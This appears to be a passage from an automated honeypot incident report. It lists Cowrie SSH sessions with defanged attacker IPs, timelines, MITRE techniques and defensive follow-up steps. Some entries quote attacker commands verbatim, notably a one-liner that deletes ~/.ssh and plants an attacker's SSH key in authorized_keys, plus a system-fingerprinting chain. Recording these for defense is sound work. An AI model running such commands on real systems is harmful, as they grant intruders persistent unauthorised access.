| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:05:50` | `cowrie.session.connect` |
| `2026-07-06 03:05:51` | `cowrie.client.version` |
| `2026-07-06 03:05:51` | `cowrie.client.kex` |
| `2026-07-06 03:05:54` | `cowrie.login.success` |
| `2026-07-06 03:05:56` | `cowrie.session.params` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.command.success` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.command.input` |
| `2026-07-06 03:05:56` | `cowrie.log.closed` |
| `2026-07-06 03:05:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c57e3359e29

| Field | Detail |
|---|---|
| **Source IP** | `181.188.176[.]242` |
| **First Seen** | 2026-07-06 03:06 |
| **Last Seen** | 2026-07-06 03:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:06:40` | `cowrie.session.connect` |
| `2026-07-06 03:06:40` | `cowrie.client.version` |
| `2026-07-06 03:06:40` | `cowrie.client.kex` |
| `2026-07-06 03:06:41` | `cowrie.login.success` |
| `2026-07-06 03:06:42` | `cowrie.session.params` |
| `2026-07-06 03:06:42` | `cowrie.command.input` |
| `2026-07-06 03:06:42` | `cowrie.command.failed` |
| `2026-07-06 03:06:42` | `cowrie.log.closed` |
| `2026-07-06 03:06:43` | `cowrie.session.params` |
| `2026-07-06 03:06:43` | `cowrie.command.input` |
| `2026-07-06 03:06:43` | `cowrie.session.file_download` |
| `2026-07-06 03:06:43` | `cowrie.log.closed` |
| `2026-07-06 03:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.176[.]242` to AbuseIPDB if not already reported
- [ ] Block `181.188.176[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09d0b6629339

| Field | Detail |
|---|---|
| **Source IP** | `181.188.176[.]242` |
| **First Seen** | 2026-07-06 03:06 |
| **Last Seen** | 2026-07-06 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:06:43` | `cowrie.session.connect` |
| `2026-07-06 03:06:43` | `cowrie.client.version` |
| `2026-07-06 03:06:44` | `cowrie.client.kex` |
| `2026-07-06 03:06:44` | `cowrie.login.success` |
| `2026-07-06 03:06:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.176[.]242` to AbuseIPDB if not already reported
- [ ] Block `181.188.176[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1db702f42f11

| Field | Detail |
|---|---|
| **Source IP** | `181.188.176[.]242` |
| **First Seen** | 2026-07-06 03:06 |
| **Last Seen** | 2026-07-06 03:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:06:45` | `cowrie.session.connect` |
| `2026-07-06 03:06:45` | `cowrie.client.version` |
| `2026-07-06 03:06:45` | `cowrie.client.kex` |
| `2026-07-06 03:06:46` | `cowrie.login.success` |
| `2026-07-06 03:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.176[.]242` to AbuseIPDB if not already reported
- [ ] Block `181.188.176[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b254a3dafa1d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:07 |
| **Last Seen** | 2026-07-06 03:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:07:03` | `cowrie.session.connect` |
| `2026-07-06 03:07:03` | `cowrie.client.version` |
| `2026-07-06 03:07:03` | `cowrie.client.kex` |
| `2026-07-06 03:07:06` | `cowrie.login.success` |
| `2026-07-06 03:07:08` | `cowrie.session.params` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:08` | `cowrie.command.success` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:08` | `cowrie.command.input` |
| `2026-07-06 03:07:09` | `cowrie.log.closed` |
| `2026-07-06 03:07:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c151a51f802c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:08 |
| **Last Seen** | 2026-07-06 03:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:08:14` | `cowrie.session.connect` |
| `2026-07-06 03:08:14` | `cowrie.client.version` |
| `2026-07-06 03:08:14` | `cowrie.client.kex` |
| `2026-07-06 03:08:17` | `cowrie.login.success` |
| `2026-07-06 03:08:19` | `cowrie.session.params` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.command.success` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.command.input` |
| `2026-07-06 03:08:19` | `cowrie.log.closed` |
| `2026-07-06 03:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11c00a11d811

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:09 |
| **Last Seen** | 2026-07-06 03:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:09:25` | `cowrie.session.connect` |
| `2026-07-06 03:09:25` | `cowrie.client.version` |
| `2026-07-06 03:09:25` | `cowrie.client.kex` |
| `2026-07-06 03:09:28` | `cowrie.login.success` |
| `2026-07-06 03:09:30` | `cowrie.session.params` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.command.success` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.command.input` |
| `2026-07-06 03:09:30` | `cowrie.log.closed` |
| `2026-07-06 03:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b80b8512ab3d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:10 |
| **Last Seen** | 2026-07-06 03:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:10:37` | `cowrie.session.connect` |
| `2026-07-06 03:10:38` | `cowrie.client.version` |
| `2026-07-06 03:10:38` | `cowrie.client.kex` |
| `2026-07-06 03:10:40` | `cowrie.login.success` |
| `2026-07-06 03:10:42` | `cowrie.session.params` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:42` | `cowrie.command.success` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:42` | `cowrie.command.input` |
| `2026-07-06 03:10:43` | `cowrie.log.closed` |
| `2026-07-06 03:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4fdf79df973

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:11 |
| **Last Seen** | 2026-07-06 03:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:11:47` | `cowrie.session.connect` |
| `2026-07-06 03:11:48` | `cowrie.client.version` |
| `2026-07-06 03:11:48` | `cowrie.client.kex` |
| `2026-07-06 03:11:50` | `cowrie.login.success` |
| `2026-07-06 03:11:51` | `cowrie.session.params` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:51` | `cowrie.command.success` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:51` | `cowrie.command.input` |
| `2026-07-06 03:11:52` | `cowrie.log.closed` |
| `2026-07-06 03:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9870e18f7ffc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 03:12 |
| **Last Seen** | 2026-07-06 03:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:12:15` | `cowrie.session.connect` |
| `2026-07-06 03:12:15` | `cowrie.client.version` |
| `2026-07-06 03:12:15` | `cowrie.client.kex` |
| `2026-07-06 03:12:17` | `cowrie.login.success` |
| `2026-07-06 03:12:18` | `cowrie.session.params` |
| `2026-07-06 03:12:18` | `cowrie.command.input` |
| `2026-07-06 03:12:18` | `cowrie.log.closed` |
| `2026-07-06 03:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7608c4ea5e4d

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]69` |
| **First Seen** | 2026-07-06 03:12 |
| **Last Seen** | 2026-07-06 03:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:12:31` | `cowrie.session.connect` |
| `2026-07-06 03:12:31` | `cowrie.client.version` |
| `2026-07-06 03:12:32` | `cowrie.client.kex` |
| `2026-07-06 03:12:33` | `cowrie.login.success` |
| `2026-07-06 03:12:34` | `cowrie.session.params` |
| `2026-07-06 03:12:34` | `cowrie.command.input` |
| `2026-07-06 03:12:34` | `cowrie.command.failed` |
| `2026-07-06 03:12:34` | `cowrie.log.closed` |
| `2026-07-06 03:12:35` | `cowrie.session.params` |
| `2026-07-06 03:12:35` | `cowrie.command.input` |
| `2026-07-06 03:12:35` | `cowrie.session.file_download` |
| `2026-07-06 03:12:35` | `cowrie.log.closed` |
| `2026-07-06 03:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]69` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1165c52a783e

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]69` |
| **First Seen** | 2026-07-06 03:12 |
| **Last Seen** | 2026-07-06 03:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:12:35` | `cowrie.session.connect` |
| `2026-07-06 03:12:35` | `cowrie.client.version` |
| `2026-07-06 03:12:36` | `cowrie.client.kex` |
| `2026-07-06 03:12:37` | `cowrie.login.success` |
| `2026-07-06 03:12:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]69` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e2117a65092

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]69` |
| **First Seen** | 2026-07-06 03:12 |
| **Last Seen** | 2026-07-06 03:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:12:37` | `cowrie.session.connect` |
| `2026-07-06 03:12:37` | `cowrie.client.version` |
| `2026-07-06 03:12:37` | `cowrie.client.kex` |
| `2026-07-06 03:12:39` | `cowrie.login.success` |
| `2026-07-06 03:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]69` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]69` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6f0fe1b4ceb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:12 |
| **Last Seen** | 2026-07-06 03:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:12:51` | `cowrie.session.connect` |
| `2026-07-06 03:12:51` | `cowrie.client.version` |
| `2026-07-06 03:12:51` | `cowrie.client.kex` |
| `2026-07-06 03:12:53` | `cowrie.login.success` |
| `2026-07-06 03:12:55` | `cowrie.session.params` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.command.success` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.command.input` |
| `2026-07-06 03:12:55` | `cowrie.log.closed` |
| `2026-07-06 03:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc710e0928f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-06 03:13 |
| **Last Seen** | 2026-07-06 03:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 03:13:54` | `cowrie.session.connect` |
| `2026-07-06 03:13:55` | `cowrie.client.version` |
| `2026-07-06 03:13:55` | `cowrie.client.kex` |
| `2026-07-06 03:13:57` | `cowrie.login.success` |
| `2026-07-06 03:13:58` | `cowrie.session.params` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:58` | `cowrie.command.success` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:58` | `cowrie.command.input` |
| `2026-07-06 03:13:59` | `cowrie.log.closed` |
| `2026-07-06 03:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee31ee865784

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 03:14 |
| **Last Seen** | 2026-07-06 03:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
